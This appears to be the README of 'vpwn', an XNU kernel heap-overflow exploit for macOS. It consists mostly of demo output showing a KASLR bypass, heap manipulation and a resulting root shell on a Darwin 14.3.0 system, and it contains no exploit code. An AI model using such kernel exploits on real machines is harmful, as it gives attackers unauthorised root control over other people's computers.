~vpwn by qwertyoruiop

generic xnu heap overflow exploitation.


demo output:

$ ./pwn
[i] Preparing payload...
[i] broke out of kaslr, kaslr_slide = 0000000001a00000
[+] Payload successfully crafted.
[i] Manipulating the heap...
[i] Exploit loaded.
[+] got r00t
sh-3.2# uname -a
Darwin qwertyoruiops-iMac.local 14.3.0 Darwin Kernel Version 14.3.0: Sat Mar  7 14:01:18 PST 2015; root:xnu-2782.20.39.0.1~1/RELEASE_X86_64 x86_64
sh-3.2# 

